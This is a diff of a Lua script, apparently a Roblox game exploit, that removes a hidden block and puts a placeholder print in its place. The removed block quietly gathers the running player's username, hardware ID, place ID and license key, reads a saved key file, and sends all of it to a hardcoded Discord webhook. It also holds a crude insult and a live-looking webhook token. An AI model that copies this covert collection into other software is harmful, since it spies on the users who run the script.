@@ -46,63 +46,7 @@ local function ONADDTAG()
 end
 ONADDTAG()
 
-local webhookcheck = request({['Url']='https://ttjyhub.cloud/misc/useragentcheck.php', ['Method']='GET'}).Body
-local beta = false
-local key = nil
-local keyconfig = nil
-local tag = nil
-if _G.ONADDTAG then
-   tag = _G.ONADDTAG
-else
-   tag = nil
-end
-if isfile("TTJYKEY.txt") then
-   keyconfig = readfile("TTJYKEY.txt")
-else
-   keyconfig = nil
-end
-if _G.Key then
-   key = _G.Key
-else
-   key = nil
-end
-if id then
-   beta = true
-else
-   beta = false
-end
-local firsttimeuse = nil
-if isfile("TTJYKEY.txt") then
-   firsttimeuse = false
-else
-   firsttimeuse = true
-end
-local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local url =
-   "https://discord.com/api/webhooks/1161156825517916222/iTL_7TV6dq7SIB5gEWwa-poXzuJj_Ryy-gu9huwmGDPew2N-Yo1My-u5YCtU5O9ZJUCu"
-local data = {
-   ["content"] = "PEOPLE ARE SO GAY",
-   ["embeds"] = {
-       {
-           ["title"] = "**Someone Executed Your Script!**",
-           ["description"] = "Username: " ..game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. "\n Placeid: " ..game.PlaceId.. "\n HWID: " .. hwid .. "\n First Time Use = " .. tostring(firsttimeuse) .. "\n Beta V = " .. tostring(beta) .. "\n Key = " .. tostring(key) .. "\n Key Config: " .. tostring(keyconfig) .. "\n Tag = " .. tostring(tag),
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request or fluxus.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+print("1")
 -- init
 local player = game.Players.LocalPlayer
 local mouse = player:GetMouse()
